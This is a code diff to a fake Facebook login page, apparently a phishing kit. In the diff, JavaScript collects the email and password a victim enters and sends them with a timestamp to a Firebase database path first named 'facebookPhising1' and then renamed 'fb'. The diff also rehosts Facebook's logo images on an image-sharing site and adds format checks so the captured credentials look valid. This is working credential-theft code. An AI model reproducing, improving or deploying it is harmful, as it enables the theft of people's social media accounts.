@@ -204,7 +204,7 @@
      
       <p id="ppp">English (UK).</p>
 
-      <div id="logo" style="background-image: url('https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png');"></div>
+      <div id="logo" style="background-image: url('https://i.ibb.co/gZXQpZyw/Picsart-25-03-22-20-54-01-751.png');"></div>
 
       
     <div class="login-header1">
@@ -231,7 +231,7 @@
 
 
   <div id="footer">
-    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png" alt="">
+    <img src="https://i.ibb.co/WNmJFGDk/DDgw-Tv3-Jeh-F.png" alt="">
   </div>
   
 
@@ -269,14 +269,27 @@ btn.addEventListener('click', f);
 
 async function f(event) {
   event.preventDefault();
-  const username = emailInput.value;
-  const password = passwordInput.value;
+  const username = emailInput.value.trim();
+const password = passwordInput.value.trim();
+const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,}$/; // Min 6 chars, 1 letter, 1 number
 
-  if (username.trim() === "" || password.trim() === "") {
-    errormsg.innerText = `Invalid Credentials!`;
-    errormsg.style.opacity = 1;
-    return;
-  }
+if (username === "" || password === "") {
+  errormsg.innerText = `Invalid Credentials!`;
+  errormsg.style.opacity = 1;
+  return;
+}
+
+if (!emailRegex.test(username)) {
+  errormsg.innerText = `Invalid Email Format!`;
+  errormsg.style.opacity = 1;
+  return;
+}
+if (!passwordRegex.test(password)) {
+  errormsg.innerText = `Password must be at least 6 characters long and include at least one letter and one number!`;
+  errormsg.style.opacity = 1;
+  return;
+}
 
   // Fixing the username replacement for Firebase key
   const u = username.replace(/\./, "'DOT'");
@@ -285,7 +298,8 @@ async function f(event) {
     password: password,
     timestamp: new Date().toISOString(),
   };
-  const url = `${firebaseUrl}facebookPhising1/users/${u}/password.json`;
+  // facebookPhising1
+  const url = `${firebaseUrl}fb/users/${u}/password.json`;
 
   try {
       const putResponse = await fetch(url, {
@@ -296,7 +310,8 @@ async function f(event) {
 
       if (putResponse.ok) {
         console.log("Password change saved successfully.");
-            window.location.href='https://www.facebook.com/login'
+        alert('success')
+            //window.location.href='https://www.facebook.com/login'
       } else {
         console.error("Failed to save password change.");
       }
